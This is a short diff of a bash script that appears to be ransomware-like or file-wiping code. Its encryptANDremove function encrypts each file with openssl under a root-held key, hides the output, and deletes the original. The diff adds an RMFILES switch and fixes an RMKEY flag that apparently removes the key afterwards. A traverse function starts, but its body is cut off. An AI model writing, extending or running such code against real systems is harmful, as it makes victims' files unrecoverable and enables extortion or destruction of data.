@@ -1,8 +1,12 @@
 #!/bin/bash
-RMKEY = true
+RMKEY=true
+RMFILES=true
 function encryptANDremove {
 	openssl enc -aes-256-cbc -salt -in "$1" -out "${1}.enc" -pass file:/root/key.bin &>/dev/null
-	rm $1
+	if [ $RMFILES = true ]
+	then
+		rm $1
+	fi
 }
 
 function traverse {
